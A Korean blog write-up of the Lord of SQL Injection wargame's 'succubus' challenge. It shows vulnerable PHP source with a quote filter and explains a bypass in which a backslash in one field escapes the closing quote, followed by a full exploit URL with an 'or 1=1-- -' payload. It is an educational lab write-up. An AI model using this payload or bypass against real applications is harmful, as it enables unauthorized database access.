---
title: Lord of SQL Injection Write Up No.17 Succubus
date: 2019-09-07 21:58:07
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 17번 succubus 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

`\`(백슬래시) 문자를 이용하여 SQL Injection을 할 수 있는지 확인한다.

### 소스 코드 분석

succubus 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe");
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("succubus");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe");
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
```

- GET 방식으로 `id`와 `pw`를 받고, `id`나 `pw`에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.
- 또한, 이번엔 `preg_match` 함수를 써서 `id`나 `pw`에 `'` 이 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("succubus");
```

- 받은 `id`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 참이 되는 어떤 문자열이든 들어있음'이다.

## Solution

1. 문자 Escape 이용

   바로 전 단계 문제와 유사하나 이번에는 `'`을 `preg_match` 함수로 필터링하여 우회하기 어렵게 만들었다.
   따라서 이번에는 함수를 우회하기보다 SQL문이 문자열로 인식하는 부분을 우회하여 풀면 편하다.

   ```php
   if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
   if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
   if(preg_match('/\'/i', $_GET[id])) exit("HeHe");
   if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");
   ```

   필터링하는 부분을 보면 `\`, 즉 백슬래시는 필터링하지 않고 있다.
   SQL문에서 `\`를 이용하여 `'`, `"`, `` ` `` 등을 이스케이프 해 주면 문자열에서 쓸 수 있게 인식한다.
   따라서 id 입력값으로 `\`, pw 입력값으로 `or 1=1-- -` 과 같이 `and pw=`가 문자열로 인식되고 그 후 `' or 1=1-- -`이 SQL문으로써 작동하도록 하면 문제가 풀리게 된다.

   ```url
   http://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php?id=\&pw= or 1=1-- -
   ```

   ```sql
   select id from prob_succubus where id='\' and pw=' or 1=1-- -'
   ```
